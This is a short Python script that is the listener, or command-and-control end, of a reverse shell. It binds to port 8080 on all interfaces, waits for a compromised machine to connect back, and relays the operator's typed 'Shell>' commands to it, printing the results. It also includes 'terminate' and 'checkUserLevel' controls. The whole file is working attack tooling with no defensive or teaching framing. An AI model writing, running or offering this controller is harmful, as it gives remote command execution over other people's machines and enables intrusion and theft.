import os
import socket
import time


def connecting():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 8080))
    s.listen(1)
    print("[+] Waiting for connection")
    conn, addr = s.accept()
    print("[+] Connected to: ", addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
        elif 'checkUserLevel' in command:
            conn.send('checkUserLevel'.encode())
            print(conn.recv(5000).decode())
        else:
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connecting()
main()